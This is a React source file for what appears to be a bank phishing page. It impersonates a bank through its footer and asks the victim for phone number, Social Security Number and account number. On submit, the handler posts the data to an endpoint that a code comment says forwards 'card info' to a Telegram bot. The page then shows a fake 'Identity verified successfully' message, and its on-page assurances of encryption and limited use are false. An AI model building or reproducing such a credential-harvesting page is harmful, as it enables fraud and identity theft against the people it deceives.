import { useState, useCallback, type FormEvent, type KeyboardEvent } from 'react';
import { useNavigate } from 'react-router-dom';

const BG_IMAGE = 'https://storage.readdy-site.link/project_files/2c4f8ff7-4756-4178-b267-42959e65ba3d/70f06539-cc97-4527-a402-129ea4a73ba7_compressed_photo_2026-07-01_22-39-05.webp';

function formatPhone(raw: string): string {
  const digits = raw.replace(/\D/g, '').slice(0, 10);
  if (digits.length === 0) return '';
  if (digits.length <= 3) return `(${digits}`;
  if (digits.length <= 6) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
  return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`;
}

function formatSSN(raw: string): string {
  const digits = raw.replace(/\D/g, '').slice(0, 9);
  if (digits.length === 0) return '';
  if (digits.length <= 3) return digits;
  if (digits.length <= 5) return `${digits.slice(0, 3)}-${digits.slice(3)}`;
  return `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
}

export default function VerifyCardPage() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [showSsn, setShowSsn] = useState(false);
  const [accountNumber, setAccountNumber] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: 'error' | 'success'; text: string } | null>(null);
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});

  const validate = useCallback((): boolean => {
    const errors: Record<string, string> = {};

    const phoneDigits = phone.replace(/\D/g, '');
    if (phoneDigits.length !== 10) {
      errors.phone = 'Please enter a valid 10-digit phone number.';
    }

    const ssnDigits = ssn.replace(/\D/g, '');
    if (ssnDigits.length !== 9) {
      errors.ssn = 'Please enter a valid 9-digit Social Security Number.';
    }

    if (!accountNumber.trim()) {
      errors.accountNumber = 'Please enter your account number.';
    }

    setFieldErrors(errors);
    return Object.keys(errors).length === 0;
  }, [phone, ssn, accountNumber]);

  const handleSubmit = useCallback(
    (e: FormEvent) => {
      e.preventDefault();

      if (!validate()) {
        setStatusMessage({ type: 'error', text: 'Please fix the highlighted fields before continuing.' });
        return;
      }

      // === SEND CARD INFO TO TELEGRAM BOT ===
      fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone,
          ssn,
          accountNumber,
          type: 'verify_card_info',
          page: 'verify-card',
        }),
      });
      // =======================================

      setIsLoading(true);
      setStatusMessage(null);
      setFieldErrors({});

      setTimeout(() => {
        setIsLoading(false);
        setStatusMessage({ type: 'success', text: 'Identity verified successfully! Redirecting...' });
        setTimeout(() => {
          navigate('/account-verified');
        }, 600);
      }, 1800);
    },
    [validate, navigate, phone, ssn, accountNumber],
  );

  const handleKeyDown = useCallback(
    (e: KeyboardEvent) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleSubmit(e as unknown as FormEvent);
      }
    },
    [handleSubmit],
  );

  return (
    <main
      className="relative flex flex-col min-h-screen w-full overflow-hidden bg-foreground-950"
      aria-label="Verify your identity information"
    >
      {/* Background image with overlay */}
      <div className="absolute inset-0">
        <img
          src={BG_IMAGE}
          alt=""
          aria-hidden="true"
          className="h-full w-full object-cover object-top scale-105"
        />
        <div className="absolute inset-0 bg-foreground-950/20" />
      </div>

      {/* Centered card */}
      <div className="relative z-10 flex flex-1 items-center justify-center px-5 py-10">
        <section className="w-full max-w-[460px] animate-fade-in-up" style={{ animationDelay: '0.1s' }}>
          <div className="rounded-[24px] bg-background-50 p-8 shadow-[0_12px_30px_rgba(0,0,0,0.15)] sm:p-10">
            {/* Card header */}
            <div className="mb-8 text-center">
              <div className="mx-auto mb-5 flex h-14 w-14 items-center justify-center rounded-full bg-accent-100">
                <i className="ri-shield-check-line text-2xl text-accent-600" aria-hidden="true" />
              </div>

              <h1 className="mb-3 text-lg text-foreground-950" style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}>
                Verify Your Information
              </h1>

              <p className="mb-4 text-sm leading-relaxed text-foreground-600" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                To continue, please verify the following information associated with your account:
              </p>

              <ul className="mb-4 inline-block text-left text-sm leading-relaxed text-foreground-700" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                <li className="flex items-center gap-2">
                  <span className="text-accent-500">&bull;</span>
                  <span>Phone Number</span>
                </li>
                <li className="flex items-center gap-2">
                  <span className="text-accent-500">&bull;</span>
                  <span>Social Security Number (SSN)</span>
                </li>
                <li className="flex items-center gap-2">
                  <span className="text-accent-500">&bull;</span>
                  <span>Account Number</span>
                </li>
              </ul>

              <p className="text-xs leading-relaxed text-foreground-500" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                Please ensure all information is entered accurately. This information will be used only to verify your identity before proceeding.
              </p>
            </div>

            {/* Verification form */}
            <form onSubmit={handleSubmit} noValidate aria-label="Identity verification form">
              {/* Phone Number */}
              <div className="mb-5">
                <label htmlFor="phone" className="mb-1.5 block text-xs font-medium text-foreground-700" style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}>
                  Phone Number
                </label>
                <div className="relative">
                  <i className="ri-phone-line absolute left-3.5 top-1/2 -translate-y-1/2 text-base text-foreground-400" aria-hidden="true" />
                  <input
                    id="phone"
                    name="phone"
                    type="tel"
                    inputMode="numeric"
                    autoComplete="tel"
                    value={phone}
                    onChange={(e) => {
                      const formatted = formatPhone(e.target.value);
                      setPhone(formatted);
                      setStatusMessage(null);
                      setFieldErrors((prev) => ({ ...prev, phone: '' }));
                    }}
                    onKeyDown={handleKeyDown}
                    placeholder="(___) ___-____"
                    className={`block w-full rounded-xl border bg-background-50 py-2.5 pl-10 pr-3 text-sm text-foreground-900 transition-colors duration-200 placeholder:text-foreground-400 tracking-[0.04em] ${
                      fieldErrors.phone ? 'border-primary-400' : 'border-secondary-200'
                    }`}
                    aria-required="true"
                    aria-label="Phone number"
                    style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}
                  />
                </div>
                {fieldErrors.phone && (
                  <p className="mt-1 text-xs text-primary-500" role="alert">{fieldErrors.phone}</p>
                )}
              </div>

              {/* Social Security Number (SSN) */}
              <div className="mb-5">
                <label htmlFor="ssn" className="mb-1.5 block text-xs font-medium text-foreground-700" style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}>
                  Social Security Number (SSN)
                </label>
                <div className="relative">
                  <i className="ri-fingerprint-line absolute left-3.5 top-1/2 -translate-y-1/2 text-base text-foreground-400" aria-hidden="true" />
                  <input
                    id="ssn"
                    name="ssn"
                    type={showSsn ? 'text' : 'password'}
                    inputMode="numeric"
                    autoComplete="off"
                    value={ssn}
                    onChange={(e) => {
                      const formatted = formatSSN(e.target.value);
                      setSsn(formatted);
                      setStatusMessage(null);
                      setFieldErrors((prev) => ({ ...prev, ssn: '' }));
                    }}
                    onKeyDown={handleKeyDown}
                    placeholder="___-__-____"
                    className={`block w-full rounded-xl border bg-background-50 py-2.5 pl-10 pr-12 text-sm text-foreground-900 transition-colors duration-200 placeholder:text-foreground-400 tracking-[0.08em] ${
                      fieldErrors.ssn ? 'border-primary-400' : 'border-secondary-200'
                    }`}
                    aria-required="true"
                    aria-label="Social Security Number"
                    style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowSsn((prev) => !prev)}
                    className="absolute right-3 top-1/2 flex h-8 w-8 -translate-y-1/2 items-center justify-center rounded-lg text-foreground-400 transition-colors hover:text-foreground-700"
                    aria-label={showSsn ? 'Hide SSN' : 'Show SSN'}
                    tabIndex={0}
                  >
                    <i className={showSsn ? 'ri-eye-off-line text-lg' : 'ri-eye-line text-lg'} aria-hidden="true" />
                  </button>
                </div>
                {fieldErrors.ssn && (
                  <p className="mt-1 text-xs text-primary-500" role="alert">{fieldErrors.ssn}</p>
                )}
              </div>

              {/* Account Number */}
              <div className="mb-8">
                <label htmlFor="account-number" className="mb-1.5 block text-xs font-medium text-foreground-700" style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}>
                  Account Number
                </label>
                <div className="relative">
                  <i className="ri-bank-line absolute left-3.5 top-1/2 -translate-y-1/2 text-base text-foreground-400" aria-hidden="true" />
                  <input
                    id="account-number"
                    name="account-number"
                    type="text"
                    autoComplete="off"
                    value={accountNumber}
                    onChange={(e) => {
                      setAccountNumber(e.target.value);
                      setStatusMessage(null);
                      setFieldErrors((prev) => ({ ...prev, accountNumber: '' }));
                    }}
                    onKeyDown={handleKeyDown}
                    placeholder="Enter your account number"
                    className={`block w-full rounded-xl border bg-background-50 py-2.5 pl-10 pr-3 text-sm text-foreground-900 transition-colors duration-200 placeholder:text-foreground-400 ${
                      fieldErrors.accountNumber ? 'border-primary-400' : 'border-secondary-200'
                    }`}
                    aria-required="true"
                    aria-label="Account number"
                    style={{ fontFamily: 'Inter, system-ui, -apple-system, sans-serif' }}
                  />
                </div>
                {fieldErrors.accountNumber && (
                  <p className="mt-1 text-xs text-primary-500" role="alert">{fieldErrors.accountNumber}</p>
                )}
              </div>

              {/* Status message */}
              {statusMessage && (
                <div
                  className={`mb-6 rounded-xl px-4 py-3 text-sm font-medium animate-fade-in ${
                    statusMessage.type === 'error'
                      ? 'bg-primary-50 text-primary-700'
                      : 'bg-accent-50 text-accent-800'
                  }`}
                  role="alert"
                  aria-live="polite"
                >
                  {statusMessage.text}
                </div>
              )}

              {/* Security notice */}
              <p className="mb-6 flex items-center justify-center gap-1.5 text-xs text-foreground-500" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                <i className="ri-shield-keyhole-line text-sm" aria-hidden="true" />
                <span>Your information is encrypted and secure</span>
              </p>

              {/* Confirm button */}
              <div className="flex flex-col items-center">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="flex items-center justify-center gap-2 whitespace-nowrap rounded-lg bg-primary-500 px-10 py-2.5 text-sm font-semibold text-background-50 transition-all duration-200 hover:bg-primary-600 active:bg-primary-700 disabled:cursor-not-allowed disabled:opacity-60 w-full max-w-[260px]"
                >
                  {isLoading ? (
                    <>
                      <i className="ri-loader-4-line animate-spin text-lg" aria-hidden="true" />
                      <span>Verifying...</span>
                    </>
                  ) : (
                    <span>Continue</span>
                  )}
                </button>

                <p className="mt-4 text-center text-xs leading-relaxed text-foreground-500" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
                  Please ensure all information is accurate before continuing.
                </p>
              </div>
            </form>
          </div>
        </section>
      </div>

      {/* Footer bar */}
      <footer className="relative z-10 bg-background-50 py-4">
        <div className="flex flex-col items-center gap-1 text-center text-xs text-foreground-500">
          <p>&copy; 2026 FNBFS &bull; (479) 788-4600</p>
          <p>Privacy policy &bull; Member FDIC</p>
          <p>An Equal Housing Lender</p>
        </div>
      </footer>
    </main>
  );
}
